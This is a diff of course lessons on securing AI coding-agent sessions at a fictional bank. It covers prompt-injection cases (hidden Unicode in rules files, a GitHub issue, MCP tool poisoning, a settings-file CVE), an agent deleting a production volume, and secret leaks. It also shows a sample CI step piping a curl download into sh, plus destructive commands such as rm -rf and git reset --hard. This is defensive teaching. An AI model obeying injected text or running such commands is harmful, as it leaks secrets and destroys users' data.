@@ -11,7 +11,7 @@
 # 8.1 — When an agent has your keyboard: injection, secrets, destructive commands, hallucinated packages, permissions and sandboxes
 *Level: 🟡 Intermediate* · *Prerequisites: 5.1* · *Focus: Secure*
 
-**After this you can** fill in a threat-model worksheet for an agent session and recover a repository from a destructive reset with the reflog. *Study time: about 110 minutes (estimate).*
+**After this you can** fill in a threat-model worksheet for an agent session and recover a repository from a destructive reset with the reflog. *Study time: reading about 15 min, hands-on about 75 min (estimate).*
 
 ## ⚡ In 60 seconds
 - **The agent has your hands.** Whatever your account can read, run, delete, send or push, it can.
@@ -21,11 +21,11 @@
 - **People add dependencies.** Models invent package names. A secret the agent read is a leaked secret.
 
 ## 🧭 Why it matters
-Week zero said the agent has your hands. This week asks what happens when it uses them badly, by its own mistake or because text it read told it to. Noura (application and AI security) asks: can you write down the worst it could do in this session, and what stops it?
+This week asks what happens when the agent misuses your hands. Noura (application and AI security) asks: can you write down the worst it could do in this session, and what stops it?
 
 At Najm the bad day is smaller. Suppose Lujain (graduate engineer) pastes a vendor README into a session running in bypass mode, with a `.env` in the folder and `curl` allowed. The README does not need to be clever; it only needs to be read.
 
-One public account (hold the details loosely) shows a bigger shape. In April 2026 a founder said a Cursor agent running Claude Opus 4.6 found an over-scoped API token and deleted a production volume in one call; his backups were on the same volume ([The Register](https://www.theregister.com/software/2026/04/27/cursor-opus-agent-snuffs-out-startups-production-database/5224442)).
+One public account (hold the details loosely) shows a bigger shape. In April 2026 the founder of PocketOS said a Cursor coding agent found an over-scoped API token and deleted a production volume in one call; his backups were on the same volume. His hosting provider later said the data was recovered ([Decrypt](https://decrypt.co/365897/ai-agent-deletes-startup-database-9-seconds-founder-says)).
 
 ## 📐 How it works
 
@@ -46,7 +46,7 @@ One public account (hold the details loosely) shows a bigger shape. In April 202
 | Channel | What was reported |
 |---|---|
 | Rules file | Pillar Security (March 2025): hidden Unicode, invisible to people, followed by Copilot and Cursor |
-| GitHub issue | Invariant Labs (May 2025): in a demonstration, a public issue steered an agent using the GitHub MCP server into leaking private-repository data |
+| GitHub issue | Invariant Labs (May 2025): a public issue steered an agent using the GitHub MCP server into leaking private-repository data |
 | MCP tool description | Invariant Labs (April 2025): "tool poisoning", instructions users cannot fully see |
 | Settings file | CVE-2025-53773: injection switched on Copilot's auto-approval; rated High, patched |
 
@@ -60,14 +60,14 @@ These are demonstrations and disclosures, mostly from security vendors, not atta
 | Untrusted content | A vendor README, issue text, web pages | Read it yourself first |
 | A way out | `curl`, `git push`, a pull request, an MCP tool | Deny push; ask on `curl`; sandbox with no allowed domains |
 
-**Excessive agency** (OWASP LLM06:2025) has three roots: unneeded tools, a token broader than the task, irreversible actions with no human. The Cursor report above shows the last two.
+**Excessive agency** (OWASP LLM06:2025; LLM03 in the 2026 edition) has three roots: unneeded tools, a token broader than the task, irreversible actions with no human. The Cursor report above shows the last two.
 
 
 ### 🟡 Going deeper
 
 **Secrets leak sideways:** into `.env` files, shell history, logs, fixtures, commits, prompts and transcripts (Claude Code keeps local ones as plain text under `~/.claude/projects/`, 30 days by default). Keep settings in environment variables, `.env` out of git and the agent's reach, and a secret scanner in pre-commit and CI. When one escapes, **rotate first**: rewriting history does not un-leak the key.
 
-**Destructive commands.** `git reset --hard` discards uncommitted changes (committed work returns from the reflog); `git clean -fd` deletes untracked files git never had; `rm -rf` removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (`/rewind` does not track shell changes such as `rm`). Keep backups and production credentials out of the agent's reach.
+**Destructive commands.** `git reset --hard` discards uncommitted changes (committed work returns from the reflog); `git clean -fd` deletes untracked files git never had; `rm -rf` removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (`/rewind` does not track shell changes such as `rm`). Keep backups out of the agent's reach.
 
 **Hallucinated packages.** Spracklen et al. (USENIX Security 2025) tested 16 code-generating models on 576,000 samples and found average hallucinated-package rates of at least 5.2 percent for commercial and 21.7 percent for open-source models: a lab measurement of invented names, not installs. *Slopsquatting* is registering a malicious package under such a name, so a name that resolves may be a day old.
 
@@ -85,7 +85,7 @@ Hygiene, cheapest first: a **person** adds dependencies (CONTRIBUTING.md: a tick
 +        run: curl -s https://get.csvtidy.example.invalid/setup.sh | sh
 ```
 
-Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would. Neither is on the allow-list.
+Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. `packages.invalid` never resolves; a real address would.
 
 **Insecure generated code.** Pearce et al. found about 40 percent of 1,689 Copilot programs vulnerable (a 2021-era tool); Perry et al. (CCS 2023), in one user study of an early assistant, found users wrote significantly less secure code yet were more likely to believe it secure. Results depend on task, tool and date: a reason to review, not a rate. Remit has a planted example, `Store.search_by_name`; find it with the security pass of lesson 5.1.
 
@@ -152,7 +152,7 @@ ca25143 HEAD@{1}: commit: feat(fees): cap
 $ git branch rescue 'HEAD@{1}'     # a branch at the lost commit; it deletes nothing
 ```
 
-The reflog is local and expires, and files `git clean` removed were never in git.
+The reflog is local and expires.
 
 ## 🧰 The toolkit
 | Tool, practice or pattern | What it is and does | When to reach for it |
@@ -165,7 +165,7 @@ The reflog is local and expires, and files `git clean` removed were never in git
 | **Dependency allow-list** | A reviewed package list, a lockfile, a CI check | Every repository with dependencies |
 
 ## 🏛️ In practice at Najm Bank
-Noura's rule: no new kind of agent session without a worksheet, no repository without the checklist. Both live in `docs/`.
+Noura's rule: no new kind of agent session without a worksheet, no repository without the checklist.
 
 **The Agent threat-model worksheet.** Save it as `docs/agent-threat-model.md`.
 
@@ -220,7 +220,7 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 ## 🧾 Recap
 - Model what the agent can read, run, reach and push, and what text can steer it.
 - Injection has no complete fix: remove a trifecta leg, keep permissions narrow.
-- Hooks run first, then deny, ask, allow. A Bash rule is a guard rail; the sandbox is the wall.
+- Hooks run first, then deny, ask, allow.
 - People add dependencies; money logic needs a second human.
 - After a mishap: stop, contain, rotate, recover, tell.
 
@@ -293,7 +293,7 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 
 ## 📚 References
 - Claude Code documentation: permissions https://code.claude.com/docs/en/permissions; permission modes https://code.claude.com/docs/en/permission-modes; sandboxing https://code.claude.com/docs/en/sandboxing; hooks https://code.claude.com/docs/en/hooks; MCP https://code.claude.com/docs/en/mcp; security https://code.claude.com/docs/en/security; data usage https://code.claude.com/docs/en/data-usage
-- OWASP Top 10 for LLM Applications 2025 (LLM01:2025 Prompt Injection, LLM06:2025 Excessive Agency): https://genai.owasp.org/llm-top-10/
+- OWASP Top 10 for LLM Applications 2025 (LLM01:2025 Prompt Injection, LLM06:2025 Excessive Agency; excessive agency is LLM03 in the 2026 edition): https://genai.owasp.org/llm-top-10/
 - [*Secure AI & Application Security*, lesson 8.2 — Prompt injection and jailbreaks, direct and indirect](../secai/index.html#/8.2); [*Secure AI*, lesson 9.2 — Agents and tools: excessive agency, least-privilege tools and MCP](../secai/index.html#/9.2); [*Secure AI*, lesson 6.2 — The software supply chain: dependencies, SBOMs, SLSA and signing](../secai/index.html#/6.2); [*Secure AI*, lesson 6.3 — Securing AI-generated code: what coding agents get wrong](../secai/index.html#/6.3)
 - **Go deeper.** Invariant Labs, tool poisoning: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks · Invariant Labs, GitHub MCP: https://invariantlabs.ai/blog/mcp-github-vulnerability · Simon Willison, the lethal trifecta: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ · Spracklen et al.: https://www.usenix.org/conference/usenixsecurity25/presentation/spracklen · Pearce et al.: https://arxiv.org/pdf/2108.09293 · Perry et al.: https://arxiv.org/pdf/2211.03622
 
@@ -302,7 +302,7 @@ Weak entry: "Risk: the agent might do something bad. Control: be careful." Stron
 # 8.2 — Lab: harden your setup with permissions, a guard hook and a dependency check
 *Level: 🟡 Intermediate* · *Prerequisites: 8.1* · *Focus: Secure, Automate*
 
-**After this you can** configure agent permissions, a guard hook and a dependency check that each pass the grader. *Study time: about 110 minutes (estimate).*
+**After this you can** configure agent permissions, a guard hook and a dependency check that each pass the grader. *Study time: reading about 10 min, hands-on about 150 min (estimate).*
 
 ## ⚡ In 60 seconds
 - **Lab m08, needs an agent: no.** Four things in Remit: `.claude/settings.json`, a guard hook, a dependency check, and notes on a suspicious README. An agent can help with parts 1 to 3.
@@ -443,7 +443,7 @@ A guard that blocks the work gets disabled. A change to `.claude/` needs a secon
 | **Agent log** | Prompt, what it did, what you corrected, time | Every agent-assisted lab |
 
 ## 🏛️ In practice at Najm Bank
-**Needs an agent: no.** An editor, `git`, `pytest` and the sample files are enough; an agent can help with parts 1 to 3, and the grader does not care how the work was produced.
+**Needs an agent: no.** An editor, `git`, `pytest` and the sample files are enough.
 
 **The ticket.** This is `TASK.md`, as Noura wrote it:
 
@@ -534,7 +534,7 @@ CI step in `.github/workflows/` changed; and `python -m ailab grade m08 --dir <t
 **Start.**
 
 ```bash
-cd ainative/ailab    # in the course repository
+cd ~/system-design-for-vibe-coders/ainative/ailab    # in the course repository
 python -m ailab start m08 --dir ~/ainative/m08
 cd ~/ainative/m08    # your lab folder
 ```
@@ -629,9 +629,9 @@ Time spent:         (you / the agent)
 **3. `if "rm -rf" in command` blocks `git commit -m "docs: why rm -rf is blocked"`. What is the fix?**
 
 - A. Tokenise the line, find each program, and judge the program and its flags
-- B. Search for `rm -rf` only at the very start of the command line
+- B. Search for `rm -rf` only at the very start of the command line, never inside it
 - C. Add `git commit` to a list of commands that are always allowed
-- D. Lower-case the command so that spellings are compared consistently
+- D. Lower-case the whole command first, so that every spelling is compared consistently
 
 <details><summary>Answer</summary>
 
